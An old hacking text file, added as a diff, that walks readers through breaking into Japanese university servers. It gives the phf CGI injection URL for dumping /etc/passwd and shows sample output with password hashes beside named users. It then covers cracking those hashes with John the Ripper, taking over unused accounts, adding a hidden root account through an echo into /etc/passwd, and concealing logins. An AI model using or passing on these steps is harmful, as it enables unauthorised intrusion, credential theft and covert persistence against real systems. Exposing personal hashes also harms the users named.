@@ -1,0 +1,138 @@
+
+
+                          _________  ___  _______      
+   \~=._      _.=~/      /   _____/ |   | \      \       \~=._      _.=~/ 
+    \   ~=__=~   /       \_____  \  |   | /   |   \       \   ~=__=~   /
+     \_.=~  ~=._/        /        \ |   |/    |    \       \_.=~  ~=._/ 
+ _.=~ \        / ~=._   /_______  / |___|\____|__  /    .=~ \        / ~=.
+L------\------/------7          \/               \/   L------\------/------7
+        \    /                                                \    / 
+         \  /             http://www.sinnerz.com               \  /   
+          \/                                                    \/
+    
+ *******************************************************************		
+ * Have a shell in 24hours after reading this, or your money back. *
+ *******************************************************************
+A Darkfool Text- member of SIN http://www.sinnerz.com
+			   Infected http://www.infected.org
+I have read many a hacking e-zines, and 'how to hack' documents before. They
+are ok, interesting etc.  but they always show you how to get root through a
+shell, what people seem to forget is the fact that you have to actually get
+the password before you can use a shell to an account. You might be lucky
+and find that l:guest p:guest will work. In this text I will show you how
+easy hacking is ( on old deformed systems ) and how you can get a shell of
+some sort in 24 hours after reading this. I am not going to go on to explain
+how to get root after getting a shell as there are 1000's of texts and C
+programs which explain this.
+OK, the very first thing you need to do is to have a WWW browser, a telnet
+program, john the ripper kracker program ( i recommend ) and a good
+dictionary file.
+WWW Browser - Netrape or MSIE are fine
+Telnet Program - One which lets you set which port you want to connect to 
+John The Ripper - Will be at http://www.sinnerz.com/darkfool 
+Dictionary File - Found at many hacking web sites. Do a search for one
+Ok, every net user/wanna be hacker will have most of those programs and if
+ya don't there really easy to get a hold of.
+OK, now I am going to tell you something about Japan. They make your stero,
+they made the bits inside your computer, they made your car, they made
+everything electronic around you, you have their eyes at the end of your
+nob, but they are rubbish at one thing, the internet and security. The
+honestly don't know anything about internet security, I have rooted or got
+shells on many a japanese servers. These are my favourite systems to attack
+because they are soooooo easy. I am also told that Australian servers are
+very easy too, some Berkeley UNiversity machines are very easy to krack too.
+Next thing you got to do is fire up your WWW browser. Goto AltaVista
+http://www.alta-vista.digital.com if you don't know already this is a search
+engine which has some very nice advance features.
+Once here in the search field box type this  url:ac.jp and press search,
+this looks for all URL's with ac.jp in.  This is academic places in Japan,
+similar to the US which has .edu instead. You will be presented with a load
+of web pages which text you probably can't read because its all in some
+funny language. More importantly is the URL which they point out, for
+example, www.mo.cs.rekimoko.ac.jp    , notice the ac.jp at the end of it.
+Click on the link to the site ( longer server urls are easier to break into
+BTW ). When the URL appears on the WWW browser box at the top of the screen
+add this line to the end of it.
+/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+or
+/cgi/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+i.e
+http://www.mo.cs.rekimoko.ac.jp/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+To all you 313375 out there, yes, i know this is the phf technique and it is
+virtually dead, but you'll be surpised where you can use this.
+This technique of finding the password file to the system is old, it was
+first used in November 1996 on the FBI web page by a few hackers. It has
+been patched up by a lot of servers, so this won't work on www.nasa.gov or
+most of www.*.com  but still works on many University servers outside of EU
+and US.
+Ok, once the URL has been entered you will see a number or things :-
+Error 404
+/cgi-bin/phf is not found on this server
+OR
+WARNING
+You do not have permission to view /cgi-bin/phf/ on this server
+There are a number of other things the server might say, but the thing you
+want it to say is the following :-
+/cgi/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+root:2fkbNba29uWys:0:1:Operator:/:/bin/csh
+www-admin:rYsKMjnvRppro:100:11:WWW administrator:/home/Common/WWW:/bin/csh
+kangaroo:3A62i9qr.YmO.:1012:10:Hisaharu
+TANAKA:/home/user/kangaroo:/usr/local/bin/tcsh
+maemae:dvUMqNmeeENFs:1016:10:Akiko Maeda:/home/user/maemae:/bin/csh
+watanaby:ewF90K0gwXVD6:1006:10:Yoshiaki WATANABE:/home/user/watanaby:/bin/csh
+kake:kFph8HEM/aaAA:1007:10:Tetsuro KAKESHITA:/home/user/kake:/bin/csh
+etc.......
+This means you have hit the jackpot ! 
+If you get something similar to this but all lines have something similar to
+the following :-
+root:*:0:1:Operator:/:/bin/csh
+www-admin:*:100:11:WWW administrator:/home/Common/WWW:/bin/csh
+kangaroo:*:1012:10:Hisaharu  TANAKA:/home/user/kangaroo:/usr/local/bin/tcsh
+maemae:*:1016:10:Akiko Maeda:/home/user/maemae:/bin/csh
+watanaby:*:1006:10:Yoshiaki WATANABE:/home/user/watanaby:/bin/csh
+kake:*:1007:10:Tetsuro KAKESHITA:/home/user/kake:/bin/csh
+( notice the * )  if you don't know already this means its shadowed and you
+cannot work out the password using a shadowed file.
+If some but not all of the logins have * in them its ok, its worthwhile
+getting the ones which aren't shadowed, hey, a shell is a shell !
+Get all the lines which aren't shadowed and then paste them into notepad,
+write the name of the server in the top line of the file and save it.
+Ok now for the next bit, this is fairly simple but can be a lengthy process
+depending upon which speed machine you have and how big your password file
+is and dictionary file. Use john the ripper or whatever password cracker you
+are using, although i recommend john the ripper because its quick. This will
+probably take a long time so go to the pub or have a drive or something....... 
+If you are lucky enough to work out the passwords to the logins then well
+done, if you don't, them find another server or increase the size of your
+dictionary file, make it as big as you can, the bigger the better, the more
+luck you will have in finding the password.
+OK, you got some passwords to a few logins, if you got root them jump around
+the room with joy ( I do ). If you didn't then, well, atleast you got
+yourself some shells. Now, if you want to keep these shells without anyone
+knowing then your best bet is to telnet to the site at port 79, you will
+have a blank prompt, here type in the username of the account you cracked,
+it will tell you the last time they logged in, do this for all the accounts,
+use the account which isn't used very much, the best ones are the ones which
+say ' User Never Logged On ' because then the account is basically yours !
+{ Note: If you get root type the following at the shell prompt :-
+echo "myserver::0:0:Test User:/:/bin/csh" >> \etc\passwd
+This wil allow you to login to the server with l:myserver so you don't get
+admin suspicous when they see people login in as root. }  
+Hide yourself as much as possible, if you already have a shell then go
+through that first when logging on, or, telnet to the hacked shell and then
+re-telnet to the hacked shell using the hacked shell, if you see what I
+mean, so your who appears as localhost. Get some C scripts which delete your
+presence etc...
+Thats it, if there's demand to explain this in further detail then please
+e-mail me telling me you want a follow up, I don't do personal help so don't
+e-mail me asking for help PLEASE DON'T !
+Thats it.....
+" Stay cool and be somebodys darkfool this year "
+Saying a quick hello to #prophet undernet. Visit me on #sin.
+I am at http://www.sinnerz.com/darkfool 
+	darkfool@sinnerz.com
+and also a lot of japanese servers ;)
+--
+ " Stay Cool and be somebody's Darkfool "
+       http://sinnerz.com/darkfool
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
